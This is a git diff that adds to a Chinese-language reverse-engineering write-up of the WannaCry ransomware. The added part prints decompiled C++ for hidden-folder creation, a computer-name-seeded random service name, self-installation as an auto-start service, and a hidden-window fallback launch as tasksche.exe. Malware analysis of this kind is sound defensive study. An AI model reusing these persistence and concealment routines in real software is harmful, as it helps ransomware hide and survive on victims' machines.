@@ -93,6 +93,8 @@ if ( *_p___argc() != 2
 - 重命名为tasksche.exe
 - 再次启动自己
 
+检查启动参数与重命名可以直接从表达式中判断出来，不复杂。
+
 **创建隐藏数据**
 
 ```C++
@@ -132,3 +134,208 @@ int __cdecl CreateHiddenData(wchar_t *p)
   return result;
 }
 ```
+
+上面的函数最终创建了**%WinDir%\ProgramData，%WinDir%\Intel**两个folder并将其属性设置为Hidden。
+
+```C++
+int __cdecl CreateFolder(LPCWSTR lpPathName, LPCWSTR lpFileName, wchar_t *String)
+{
+  int result; 
+  DWORD fac; 
+
+  CreateDirectoryW(lpPathName, 0);
+  if ( SetCurrentDirectoryW(lpPathName) && (CreateDirectoryW(lpFileName, 0), SetCurrentDirectoryW(lpFileName)) )
+  {
+    fac = GetFileAttributesW(lpFileName);
+    LOBYTE(fac) = fac | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN;  <<==== Note here.
+    SetFileAttributesW(lpFileName, fac);
+    if ( String )
+      swprintf(String, aSS, lpPathName, lpFileName);
+    result = 1;
+  }
+  else
+  {
+    result = 0;
+  }
+  return result;
+}
+```
+
+上面是CreateFolder的代码，很容易理解，主要是对通过此函数创建的Folder设置Hidden属性。
+
+**再次启动自己**
+
+```C++
+BOOL StartMalware()
+{
+  char szFullPath[520];
+
+  szFullPath[0] = szSelfName;
+  memset(&szFullPath[1], 0, 516u);
+  *&szFullPath[517] = 0;
+  szFullPath[519] = 0;
+  GetFullPathNameA(FileName, 520u, szFullPath, 0);
+  return StartService(szFullPath) && WaitMutex4Times(60) || StartProcess(szFullPath, 0, 0) && WaitMutex4Times(60);
+}
+```
+
+注意最后一行的代码，Wannacry会用2中种方式再次启动自己，首先尝试将自己伪装成服务程序，如果失败了，在尝试通用的进程方式。
+
+*服务方式*
+
+在利用服务方式启动的时候，Wannacry首先会利用在WinMain中初始化的一个随机序列作为服务名称。 下面是生成随机序列的代码：
+
+```C++
+int __cdecl CreateRandomSequence(char *displayname)
+{
+  unsigned int nSeed; 
+  int pBuffer; 
+  size_t nLen; 
+  int index;
+  int v5;
+  int v6; 
+  int result; 
+  __int16 Buffer[200]; 
+  DWORD nSize; 
+  unsigned int i; 
+
+  Buffer[0] = g_ComputerName;
+  nSize = 399;
+  memset(&Buffer[1], 0, 396u);
+  Buffer[199] = 0;
+  GetComputerNameW(Buffer, &nSize);
+  i = 0;
+  nSeed = 1;
+  if ( wcslen(Buffer) )
+  {
+    pBuffer = Buffer;
+    do
+    {
+      nSeed *= *pBuffer;
+      ++i;
+      pBuffer += 2;
+      nLen = wcslen(Buffer);
+    }
+    while ( i < nLen );
+  }
+  srand(nSeed);
+  index = 0;
+  v5 = rand() % 8 + 8;
+  if ( v5 > 0 )
+  {
+    do
+      displayname[index++] = rand() % 26 + 'a';
+    while ( index < v5 );
+  }
+  v6 = v5 + 3;
+  while ( index < v6 )
+    displayname[index++] = rand() % 10 + '0';
+  result = displayname;
+  displayname[index] = 0;
+  return result;
+}
+```
+
+这段代码利用了用户的计算机名称，通过对计算机名称的每一个自己进行乘法溢出运算，会得到一个初始化随机发生器的种子值，并利用随机数发生器来生成随机的服务名称。 这个随机的服务名称由'a-z''0-9'组成。
+
+```C++
+signed int __cdecl StartService(char *pFullpath)
+{
+  signed int result; 
+  SC_HANDLE hSCService; 
+  char lpBinaryPathName; 
+  SC_HANDLE hSCObject; 
+  int nRet; 
+  SC_HANDLE hSCManager; 
+
+  nRet = 0;
+  hSCManager = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS);
+  if ( hSCManager )
+  {
+    hSCObject = OpenServiceA(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
+    if ( hSCObject )
+    {
+      StartServiceA(hSCObject, 0, 0);
+      CloseServiceHandle(hSCObject);
+      result = 1;
+    }
+    else
+    {
+      sprintf(&lpBinaryPathName, Format, pFullpath);// cmd.exe /c "%s"
+      hSCService = CreateServiceA(
+                     hSCManager,
+                     szServiceName,
+                     szServiceName,
+                     SERVICE_ALL_ACCESS,
+                     SERVICE_WIN32_OWN_PROCESS,
+                     SERVICE_AUTO_START,
+                     SERVICE_ERROR_NORMAL,
+                     &lpBinaryPathName,
+                     0,
+                     0,
+                     0,
+                     0,
+                     0);
+      if ( hSCService )
+      {
+        StartServiceA(hSCService, 0, 0);
+        CloseServiceHandle(hSCService);
+        nRet = 1;
+      }
+      result = nRet;
+    }
+    CloseServiceHandle(hSCManager);
+  }
+  else
+  {
+    result = 0;
+  }
+  return result;
+}
+```
+
+Wannacry利用StartService函数将自身作为一个带有随机服务名称的服务进行启动，这是最容易掩人耳目的隐蔽手段。 但是如果没有权限操作服务管理器，或者意外失败了，Wannacry还有常规启动方法作为备选。
+
+```C++
+int __cdecl StartProcess(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
+{
+  int result; 
+  struct _STARTUPINFOA StartupInfo;
+  struct _PROCESS_INFORMATION ProcessInformation; 
+
+  StartupInfo.cb = 0x44;
+  memset(&StartupInfo.lpReserved, 0, 0x40u);
+  ProcessInformation.hProcess = 0;
+  ProcessInformation.hThread = 0;
+  ProcessInformation.dwProcessId = 0;
+  ProcessInformation.dwThreadId = 0;
+  StartupInfo.wShowWindow = 0;
+  StartupInfo.dwFlags = 1;
+  if ( CreateProcessA(0, lpCommandLine, 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &StartupInfo, &ProcessInformation) )  <<=== Note here 
+  {
+    if ( dwMilliseconds )
+    {
+      if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
+        TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);
+      if ( lpExitCode )
+        GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);
+    }
+    CloseHandle(ProcessInformation.hProcess);
+    CloseHandle(ProcessInformation.hThread);
+    result = 1;
+  }
+  else
+  {
+    result = 0;
+  }
+  return result;
+}
+```
+
+StartProcess函数作为备选使用常规方式启动一个进程，这里被传入的CommandLine就是已经被改过名称为tasksche.exe的程序路径了，至少用这个名称这也有一些迷惑作用,并且一个小细节，设置了非窗口模式。
+
+
+
+
+
+
